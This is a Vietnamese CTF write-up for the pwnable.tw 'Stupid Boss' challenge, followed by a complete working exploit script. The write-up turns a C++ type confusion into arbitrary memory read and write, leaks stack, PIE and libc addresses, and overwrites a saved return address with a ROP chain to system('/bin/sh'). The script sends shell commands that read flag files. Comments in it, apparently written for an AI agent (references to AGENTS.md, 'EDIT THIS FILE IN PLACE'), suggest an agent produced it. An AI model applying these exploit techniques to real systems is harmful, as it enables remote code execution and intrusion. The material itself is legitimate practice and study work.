+++
title = 'Pwnable.tw - Stupid Boss'
date = 2026-10-12T12:10:00+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Stupid Boss

`nc chall.pwnable.tw 10409`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Stupid Boss/stupid
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Đề cho C++ source `stupid.cpp`, libc là glibc 2.23. Chương trình quản lý project và các ngôn ngữ. Mỗi ngôn ngữ là một lớp con; phần đầu object giống nhau nhưng field ở offset `0x38` lại khác kiểu:

```text
0x00  vptr
0x08  language id
0x10  name (std::string)
0x30  ratio (unsigned long)
0x38  version: char* ở C/Javascript, double ở Python/Java
```

`Project::change_language` chỉ hỏi `compatible()` rồi `reinterpret_cast` object hiện tại sang lớp ngôn ngữ mới, không xây lại object. Vì vậy phương thức của lớp mới có thể ghi field `0x38` dưới dạng `double`, trong khi phương thức lớp cũ vẫn đọc nó như một con trỏ.

Ban đầu trông như bug chỉ làm crash. Điều làm nó khai thác được là chương trình cho mình quay lại phương thức của kiểu cũ sau khi trường con trỏ đã bị ghi lại.

```cpp
// Rút gọn nhánh just-edit trong change_language():
if (old_language->compatible(new_language)) {
    // Object vẫn là lớp cũ, không có delete/new.
    reinterpret_cast<NewLanguage *>(old_language)->set_version();
}
```

### 2. Khai thác

#### Leak stack

Trong `Project::create`, `ratio` được đọc bằng `scanf("%lu", &r)`. Mình nhập `.`: `scanf` trả 0 và không đụng tới `r`, nên giá trị stack cũ được chép vào object. `basic_info()` in nó dưới dạng unsigned long và làm lộ một stack pointer `S`. Đây là leak đầu tiên; trước đó PIE và ASLR khiến địa chỉ object hay stack đều chưa biết.

#### Type confusion thành arbitrary read

Với project Trojan, boss cho phép đổi C sang Python. Code vẫn giữ object `L_C`, nhưng gọi edit của `L_Python`. `scanf("%lf")` ghi tám byte vào field `0x38` như một `double`; lúc hiển thị lại, `L_C::info()` lấy cùng tám byte làm `char *version` và in chuỗi tại địa chỉ đó. Mình encode địa chỉ cần đọc thành bit pattern của số double rồi nhập qua menu.

Để `scanf("%lf")` nhận đúng **từng bit** của địa chỉ, script đổi qword sang double rồi dùng dạng hex float (`%a`), thay vì in một số thập phân dễ bị làm tròn:

```py
def as_double(addr):
    return float.hex(struct.unpack('<d', p64(addr))[0]).encode()
```

`%s` dừng ở NUL, nên đọc con trỏ 8 byte đôi khi chỉ được vài byte. Script đọc lại từ địa chỉ kế tiếp và ghép các đoạn. Đây là primitive đủ để đọc saved RIP và GOT.

Từ `S`, mình quét stack và thấy saved RIP của `manage_project` tại `S+0x158`; nó trỏ tới `main+0x9e`, vậy lấy được PIE base. Full RELRO khiến GOT không ghi được, nhưng các entry đã resolve vẫn **đọc** được. Đọc `read@GOT`, `puts@GOT`, `scanf@GOT` cho cùng một libc base, sau đó mới dựng ROP.

#### Ghi saved RIP

Project Web có lỗi tương tự ở cặp Javascript/Java: kiểm tra `strstr("Javascript", "Java")` cho kết quả đúng. Edit object Javascript như Java để đặt tám byte địa chỉ vào `version`; khi quay lại edit theo kiểu Javascript, code gọi `read(0, version, 20)`. Từ đây có thể ghi 20 byte tới địa chỉ tùy chọn.

```py
def web_write(io, addr, data):
    assert len(data) == 20
    change_language(io, 'w', [(Java, b'0', as_double(addr)), (Ruby, b'0', b'0')])
    change_language(io, 'w', [(Javascript, b'0', data), (Ruby, b'0', b'0')])
```

Mình ghi ROP chain lên saved RIP của `manage_project` bằng các lần ghi 20 byte chồng nhau. Chain dùng gadget `ret` nếu cần căn chỉnh stack, rồi gọi `system("/bin/sh")` với `/bin/sh` trong libc. Thoát menu làm hàm return vào chain.

Các giá trị quan trọng mình đo trong local rồi xác nhận bằng leak ở remote:

| Giá trị | Cách tính |
|---|---|
| saved RIP của `manage_project` | `S + 0x158` |
| PIE base | `*(S + 0x158) - 0x40e1` |
| libc base | `read@GOT - libc.sym['read']`, đối chiếu thêm `puts` và `scanf` |
| target ghi ROP | saved RIP của `manage_project` |

Với primitive đọc/ghi ở trên, phần cuối script rút gọn thành:

```py
mp_ret = S + 0x158
exe.address = tro_read_ptr(io, mp_ret) - 0x40e1
libc.address = tro_read_ptr(io, exe.got['read']) - libc.sym['read']

rop = ROP(libc)
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
write_mem(io, mp_ret, rop.chain())
leave_manage(io)  # ret vào chain
```

Script thật thêm một gadget `ret` nếu `rsp` chưa căn đúng 16 byte trước `system`.

Lần chạy remote lấy được shell, sau đó đọc flag:

```text
FLAG{My_5+up1d_B0s5es_ar3_s0_dumb_th3y_Thlnk_J4v4_&_J4v45cripT_4r3_th3_s4m3}
```

`FLAG: FLAG{My_5+up1d_B0s5es_ar3_s0_dumb_th3y_Thlnk_J4v4_&_J4v45cripT_4r3_th3_s4m3}`

### Full exploit

`exploit.py` đã dùng cho bài này:

```py
#!/usr/bin/env python3
# EDIT THIS FILE IN PLACE with the Edit tool. Never re-emit it as a heredoc. Never create exploit2.py.
from pwn import *
import re, struct, time

exe = ELF('/home/lwd3c/Desktop/Pwn/pwnable.tw/Stupid Boss/stupid', checksec=False)
libc = ELF('/home/lwd3c/Desktop/Pwn/pwnable.tw/Stupid Boss/libc.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

HOST, PORT = "chall.pwnable.tw", "10409"

# checksec first (AGENTS.md Section 2) -> auto-captured in this script's log
log.info("\n" + exe.checksec())

# ---- measured-number ledger: every address/offset used below goes through this ----
def fact(name, value, cmd):
    """record a MEASURED value in ./facts.tsv via 'p fact set' (never a recalled number)"""
    import subprocess
    v = value if isinstance(value, str) else (hex(value) if isinstance(value, int) else str(value))
    subprocess.run(["p", "fact", "set", f"{name}={v}", "--src", cmd], check=False)
    return value

# ---- I/O shortcuts (resolve the live tube `p` at call time, so retries rebind cleanly) ----
info = lambda msg: log.info(msg)
s    = lambda data, proc=None: (proc or p).send(data)
sa   = lambda msg, data, proc=None: (proc or p).sendafter(msg, data)
sl   = lambda data, proc=None: (proc or p).sendline(data)
sla  = lambda msg, data, proc=None: (proc or p).sendlineafter(msg, data)
sn   = lambda num, proc=None: (proc or p).send(str(num).encode())
sna  = lambda msg, num, proc=None: (proc or p).sendafter(msg, str(num).encode())
sln  = lambda num, proc=None: (proc or p).sendline(str(num).encode())
slna = lambda msg, num, proc=None: (proc or p).sendlineafter(msg, str(num).encode())
r    = lambda n=4096, proc=None: (proc or p).recv(n)
rl   = lambda proc=None: (proc or p).recvline()
ru   = lambda delim=b'\n', proc=None: (proc or p).recvuntil(delim)
ra   = lambda proc=None: (proc or p).recvall()

def GDB():
    if args.REMOTE:
        return
    gdb.attach(p, gdbscript="""
        

    """)

def start():
    if args.REMOTE:
        return remote(HOST, int(PORT))
    qemu_bin = None
    if qemu_bin:
        io = process([qemu_bin] + qemu_args + [exe.path])  # type: ignore
    else:
        # ./run.sh (written by 'p env probe') pins the challenge's own ld/libc+env
        io = process(['./run.sh']) if os.path.exists('run.sh') else process([exe.path])
    if args.GDB:
        GDB()
    return io

# ---- shell-verification gate (AGENTS.md Sections 10 & 13): a run only counts if this passes ----
# ORW/seccomp challenges have no shell -> override expect, e.g. verify(io, b"CSCV2026{").
def verify(io, expect=b"uid=", timeout=3):
    """True only if `expect` actually came back after the probe. Deadline-based.

    A single io.recv() used to judge ONE chunk, so any target that prints after
    the payload (a trailing puts("bye"), a menu redraw) handed that echo to the
    check and a WORKING shell scored FAIL -- a false NEGATIVE that sends you
    hunting a bug that does not exist. Now: drain what the target already said,
    send the probe, then ACCUMULATE reads until `expect` shows up or the
    deadline passes. No shell still means no shell -- nothing below relaxes the
    failure path, and the drained bytes are the same bytes the old recv() would
    have returned first (so an ORW run whose flag landed pre-probe still counts).
    """
    import time
    try:
        pre = io.clean(0.2) or b""      # the target's own trailing output
        io.sendline(b"id")
    except Exception:
        return False
    buf, deadline = bytes(pre), time.time() + timeout
    while expect not in buf and time.time() < deadline:
        try:
            chunk = io.recv(timeout=max(0.1, deadline - time.time()))
        except EOFError:
            break                        # target died: no shell, fall through to FAIL
        except Exception:
            break
        if chunk:
            buf += chunk
    ok = expect in buf
    (log.success if ok else log.failure)(
        "verify: " + buf.decode(errors="replace").strip()[:100])
    return ok

# ---- parity gate: never fire REMOTE before a LOCAL run proved a verified shell ----
PROOF = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".local_shell_ok")

#   ====================== game driver (stupid.cpp) ==========================
# Language subclass layout (measured, see facts.tsv):
#   0x00 vptr | 0x08 lang(int) | 0x10 std::string name (32B) | 0x30 ratio(ul)
#   0x38 derived member: char* version (L_C, L_Javascript) / double version
#        (L_Ruby, L_Python, L_Java) / std::string arch (L_ASM)
ASM, C, Ruby, Java, Python, Javascript = range(6)
LNAME = {ASM: 'ASM', C: 'C', Ruby: 'Ruby', Java: 'Java',
         Python: 'Python', Javascript: 'Javascript'}
# select_lang() menu index per project (Trojan: ASM/C/Python, Web: Ruby/Java/Javascript)
TRO_CH = {ASM: b'1', C: b'2', Python: b'3'}
WEB_CH = {Ruby: b'1', Java: b'2', Javascript: b'3'}


def as_double(addr):
    """hex-float text for the double whose 64 bits ARE `addr`.
    L_Java/L_Python::set_version does scanf("%lf", &version); on a
    type-confused L_Javascript/L_C that field is the `char *version`, so a
    bit-exact double literal is an 8-byte arbitrary pointer write.
    float.hex() is exact by construction (C99 %a, parsed by glibc strtod)."""
    return float.hex(struct.unpack('<d', p64(addr))[0]).encode()


# --- stack deltas off the leaked create()-frame pointer S (all MEASURED, see
# --- facts.tsv): both are differences between two frame-relative stack slots,
# --- so they are compiler constants, independent of the environment size.
S_TO_LIBC_RET = 0x188      # holds __libc_start_main+0xf0  (libc+0x20830)
S_TO_MP_RET = 0x158        # manage_project()'s saved RIP, holding main+0x9e
LIBC_RET_OFF = 0x20830     # its libc offset
MP_RET_VALUE_OFF = 0x40e1  # main+0x9e, the PIE offset it holds
# raw (unrebased) libc offsets, captured before libc.address is ever assigned
LIBC_OFF = {s: libc.symbols[s] for s in ('read', 'puts', 'scanf', 'system')}


# I/O convention: every helper ENTERS with the prompt it answers already
# consumed, and LEAVES the next prompt consumed too.  "state A" = the main
# menu's "Your choice: " has been eaten.
PROMPT = b'Your choice: '


def status(io):
    """option 1 -> {lang: exp}"""
    io.sendline(b'1')
    data = io.recvuntil(PROMPT)
    return {k.decode(): int(v) for k, v in
            re.findall(rb'(\w+)\s+:\s+(\d+) exp\.', data)}


def fight(io):
    """option 2.  battle() PRINTS the enemy number, so play adaptively:
    a minion counts a draw as a win (it only scores a loss on enemy==you+1),
    while the king needs you==enemy+1 and re-rolls rand() off time(NULL) every
    round (same second -> same number), so the previous round's enemy is the
    best predictor.  Returns the post-fight blob, stopping either at create()'s
    first language prompt (a boss just handed out a project) or at state A."""
    io.sendline(b'2')
    io.recvuntil(b'Please enter number 1 :')
    guess = 0
    for i in range(5):
        if i:
            io.recvuntil(b'Please enter number %d :' % (i + 1))
        io.sendline(str(guess).encode())
        io.recvuntil(b'Enemy: ')
        guess = (int(io.recvline().strip()) + 1) % 5
    return io.recvuntil((b'Select language 1: ', PROMPT))


def pick_version(io, lang, arg=b'0'):
    """answer the per-subclass set_*() prompt that set_lang() fires"""
    if lang == ASM:
        io.recvuntil(b'architecture of the ASM: ')
        if arg is not None:                 # arg=None: the un-parsed ratio byte
            io.sendline(arg)                # scanf ungetc'd is the cin >> token
    elif lang == C:
        io.recvuntil(b'Please select a C standard version:')
        io.recvuntil(PROMPT)
        io.sendline(b'1')                                          # new char[5]="C89"
    elif lang == Javascript:
        io.recvuntil(b'supported javascript engine: ')
        io.send(arg.ljust(20, b'\x00')[:20])                       # read(0,version,20)
    else:
        io.recvuntil(b'version number: ')
        io.sendline(arg)                                           # scanf("%lf")


def _slots(io, table, slots, first_prompt_eaten):
    for n, (lang, ratio, arg) in enumerate(slots):
        if n or not first_prompt_eaten:
            io.recvuntil(PROMPT)                                   # select_lang()
        io.sendline(table[lang])
        io.recvuntil(b'Ratio: ')
        io.sendline(ratio)
        pick_version(io, lang, arg)


def create(io, project, slots):
    """Project::create(), entered from the boss text -> back to state A"""
    _slots(io, TRO_CH if project == 't' else WEB_CH, slots, True)
    io.recvuntil(PROMPT)


def manage(io, project):
    """state A -> inside Project::manage(), its menu prompt consumed"""
    io.sendline(b'3')
    io.sendlineafter(b'> : ', project.encode())
    io.recvuntil(PROMPT)


def change_language(io, project, slots):
    """Project::change_language() -- always runs over BOTH slots.
    A slot entry is (lang, ratio_bytes, set_version_arg).  A ratio_bytes that
    scanf("%lu") cannot parse leaves `ul r` (rbp-0x20) UNINITIALISED, and the
    just-edit path then publishes it via set_ratio() -> basic_info()."""
    io.sendline(b'2')
    _slots(io, TRO_CH if project == 't' else WEB_CH, slots, False)
    io.recvuntil(PROMPT)


def show_info(io):
    io.sendline(b'1')
    return io.recvuntil(PROMPT)


def leave_manage(io):
    io.sendline(b'3')
    io.recvuntil(PROMPT)


TRO_R0 = b'.'      # ratio fed to create()'s slot0: '.' fails scanf -> uninit `ul r`


def grind(io):
    """fight until both stupid bosses have handed out a project"""
    have = set()
    for n in range(1, 200):
        blob = fight(io)
        if b'make a trojan horse' in blob:
            create(io, 't', [(ASM, TRO_R0, None if TRO_R0 == b'.' else b'x'), (C, b'2', b'')])
            have.add('t')
            log.success('fight %d: trojan created (slot0=L_ASM, slot1=L_C)' % n)
        elif b'make a website' in blob:
            create(io, 'w', [(Java, b'1', b'0'), (Ruby, b'2', b'0')])
            have.add('w')
            log.success('fight %d: web created (slot0=L_Java, slot1=L_Ruby)' % n)
        if len(have) == 2:
            log.success('grind done after %d fights' % n)
            return
        if n % 10 == 0:
            log.info('fight %d: %s' % (n, status(io)))
    log.error('grind did not finish')


def classify(io, addr):
    """LOCAL ONLY: name the mapping an address falls in, from /proc/pid/maps.
    This is how the uninit-r leak is identified (never recalled)."""
    if args.REMOTE:
        return ''
    try:
        for line in open('/proc/%d/maps' % io.pid):
            rng, rest = line.split(' ', 1)
            lo, hi = (int(x, 16) for x in rng.split('-'))
            if lo <= addr < hi:
                path = line.split()[-1]
                return '%s  base=%#x  off=%#x' % (path, lo, addr - lo)
    except Exception as ex:
        return 'classify failed: %r' % (ex,)
    return 'UNMAPPED'


def maps(io):
    out = []
    for line in open('/proc/%d/maps' % io.pid):
        f = line.split()
        lo, hi = (int(x, 16) for x in f[0].split('-'))
        out.append((lo, hi, f[-1]))
    return out


def mem(io, addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb', 0) as f:
        f.seek(addr)
        return f.read(n)


def stackmap(io, S, lo=-0x400, hi=0x1200):
    """LOCAL measurement: every qword near S that points into libc or the PIE
    image, keyed by its offset from the leaked stack pointer S."""
    mm = maps(io)
    def owner(a):
        for l, h, pth in mm:
            if l <= a < h:
                return pth, l
        return None, None
    libc = [(l, h) for l, h, pth in mm if pth.endswith('libc.so.6')]
    pie  = [(l, h) for l, h, pth in mm if pth.endswith('/stupid')]
    rows = []
    blob = mem(io, S + lo, hi - lo)
    for i in range(0, len(blob) - 8, 8):
        q = u64(blob[i:i + 8])
        a = S + lo + i
        for l, h in libc:
            if l <= q < h:
                rows.append(('libc', a - S, q - l))
        for l, h in pie:
            if l <= q < h:
                rows.append(('pie', a - S, q - l))
    return rows


def show_info_from_manage(io):
    manage(io, 't')
    return show_info(io)


def ratios(blob):
    """every 'Ratio: N %' basic_info() printed, in slot order"""
    return [int(x) for x in re.findall(rb'Ratio: (\d+) %', blob)]


#   ================= the two primitives the bug hands us ====================
# READ  (Trojan): slot1 is a live L_C.  Trojan::compatible(Python, C) is true
#   ("Stupid Boss B think C and Python are pretty similar"), so change_language
#   reinterpret_casts it to L_Python and scanf("%lf") overwrites `char *version`
#   -> L_C::info() then prints the C string at that address.
# WRITE (Web):    slot0 is a live L_Javascript.  Web::compatible does
#   strstr("Javascript", "Java") != NULL ("I hate my stupid Boss A"), so the
#   object is reinterpret_cast to L_Java and scanf("%lf") sets `char *version`;
#   editing it as Javascript again then does read(0, version, 20).

def tro_read(io, addr):
    """the raw bytes cout printed for (char *)addr -- i.e. up to the first NUL"""
    change_language(io, 't', [(ASM, b'0', b'x'), (Python, b'0', as_double(addr))])
    blob = show_info(io)
    m = re.search(rb'C standard version: (.*?)\n\n1\. Show project', blob, re.S)
    if not m:
        log.error('read at %#x did not come back: %r' % (addr, blob[-120:]))
    return m.group(1)


def tro_read_ptr(io, addr):
    """exact 8 bytes at addr.  cout << (char*) stops at a NUL, so a pointer
    with a zero byte inside (e.g. a PIE base of 0x5555_6500_0000) comes back
    truncated -- restart the read one byte past each NUL instead of guessing."""
    out = bytearray(8)
    i = 0
    while i < 8:
        b = tro_read(io, addr + i)
        if not b:
            i += 1                      # that byte is the NUL; leave it 0
            continue
        n = min(len(b), 8 - i)
        out[i:i + n] = b[:n]
        i += len(b) + 1                 # consume the run AND its terminator
    return u64(bytes(out))


def web_new_js(io):
    """slot0 is L_Java; Javascript is NOT compatible with it, so this takes the
    delete+new branch and installs a real L_Javascript (version = new char[30])"""
    change_language(io, 'w', [(Javascript, b'0', b'A'), (Ruby, b'0', b'0')])


def web_write(io, addr, data):
    """20 bytes of `data` at `addr`, via the Java/Javascript confusion pair"""
    assert len(data) == 20, len(data)
    change_language(io, 'w', [(Java, b'0', as_double(addr)), (Ruby, b'0', b'0')])
    change_language(io, 'w', [(Javascript, b'0', data), (Ruby, b'0', b'0')])


def write_mem(io, addr, data):
    """arbitrary-length write out of 20-byte reads; the tail chunk is shifted
    back so the last byte written is exactly addr+len(data)-1 (no overrun)"""
    assert len(data) >= 20, 'short writes would overrun'
    i = 0
    while i < len(data):
        off = i if len(data) - i >= 20 else len(data) - 20
        web_write(io, addr + off, data[off:off + 20])
        i = off + 20


def exploit(io):
    io.timeout = 30
    io.recvuntil(PROMPT)                                   # -> state A
    grind(io)

    # ---- stage 1: create()'s uninitialised `ul r` -> a raw stack pointer ----
    manage(io, 't')
    S = ratios(show_info(io))[0]
    log.success('leaked stack pointer S = %#x  %s' % (S, classify(io, S)))
    if S >> 47 or not S or S % 16:
        log.error('S is not a plausible 16-aligned stack pointer -- STOP')

    # ---- stage 2a: locate manage_project()'s saved RIP -> PIE base ----
    # The measured delta is checked, never trusted: main+0x9e has low 12 bits
    # 0x0e1 whatever the PIE base is, so the slot identifies itself.  If the
    # remote libstdc++ left a different pointer in S, fall back to a scan.
    mp_ret_slot = pie_base = None
    for delta in [S_TO_MP_RET] + list(range(0x80, 0x280, 8)):
        v = tro_read_ptr(io, S + delta)
        if v & 0xfff == MP_RET_VALUE_OFF & 0xfff and 0 < v >> 40 < 0x10000 \
                and (v - MP_RET_VALUE_OFF) & 0xfff == 0:
            mp_ret_slot, pie_base = S + delta, v - MP_RET_VALUE_OFF
            log.success('manage_project saved RIP at S+%#x  (= PIE+%#x)'
                        % (delta, MP_RET_VALUE_OFF))
            break
        log.debug('  S+%#x = %#x  (not main+%#x)' % (delta, v, MP_RET_VALUE_OFF))
    if pie_base is None:
        log.error("no slot near S holds main+%#x -- cannot place the chain, STOP"
                  % MP_RET_VALUE_OFF)
    exe.address = pie_base
    log.success('pie  base = %#x   %s' % (pie_base, classify(io, pie_base)))

    # ---- stage 2b: Full RELRO means the GOT is read-only but RESOLVED ----
    bases = {}
    for sym in ('read', 'puts', 'scanf'):
        got = tro_read_ptr(io, exe.got[sym])     # exe.address is set: absolute
        bases[sym] = got - LIBC_OFF[sym]
        log.info('  %s@got = %#x -> libc base %#x' % (sym, got, bases[sym]))
    cand = {b for b in bases.values() if b > 0 and b & 0xfff == 0}
    if len(cand) != 1:
        log.error('GOT entries disagree on the libc base: %r -- STOP' % (bases,))
    libc.address = cand.pop()
    log.success('libc base = %#x   %s' % (libc.address, classify(io, libc.address)))
    leave_manage(io)

    # ---- stage 3: ret2libc over manage_project()'s saved RIP ----
    rop = ROP(libc)
    ret = rop.find_gadget(['ret'])[0]
    # entering system() must look like a call: rsp % 16 == 8 there
    if (mp_ret_slot + 8 * 3) % 16 != 8:
        rop.raw(ret)
    rop.call(libc.address + LIBC_OFF['system'],
             [next(libc.search(b'/bin/sh\x00'))])
    chain = rop.chain()
    log.info('ROP chain @ %#x\n%s' % (mp_ret_slot, rop.dump()))

    manage(io, 'w')
    web_new_js(io)
    write_mem(io, mp_ret_slot, chain)

    # manage() returns -> manage_project() breaks out and rets into the chain
    io.sendline(b'3')
    # ===========================================================================

FLAG_RE = re.compile(rb'FLAG\{[^}]+\}')


def grab_flag(io):
    """a flag counts only on a FULL FLAG{...} match read off the real target"""
    io.sendline(b'cat /home/*/flag; cat /home/*/FLAG; cat /flag*; id; ls -la /home/*')
    buf, end = b'', time.time() + 20
    while time.time() < end:
        try:
            c = io.recv(timeout=2)
        except Exception:
            break
        if c:
            buf += c
            if FLAG_RE.search(buf):
                break
    log.info('target said:\n' + buf.decode(errors='replace')[-1200:])
    m = FLAG_RE.search(buf)
    if not m:
        log.failure('no complete FLAG{...} in the response')
        return None
    flag = m.group(0).decode()
    if args.REMOTE:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               'FLAG'), 'w') as f:
            f.write(flag + '\n')
        log.success('FLAG (from chall.pwnable.tw): ' + flag)
    else:
        log.info('LOCAL output, not a flag: ' + flag)
    return flag


def run_once():
    global p
    p = start()
    exploit(p)
    return verify(p)

def main():
    if args.REMOTE and not os.path.exists(PROOF) and not args.FORCE:
        log.error("parity gate: no verified LOCAL shell yet -- run locally first, or pass FORCE=1")
    tries = int(args.TRIES) if args.TRIES else 1
    for i in range(1, tries + 1):
        if tries > 1:
            log.info(f"attempt {i}/{tries}")
        try:
            ok = run_once()
        except Exception as ex:
            log.warning(f"attempt {i}: {type(ex).__name__}: {ex}")
            ok = False
        if ok:
            if not args.REMOTE:
                open(PROOF, "w").close()
            grab_flag(p)
            p.interactive()
            return
        try:
            p.close()
        except Exception:
            pass
    log.failure(f"no verified shell after {tries} attempt(s)")

# Gud luk pwner !
if __name__ == "__main__":
    main()
```
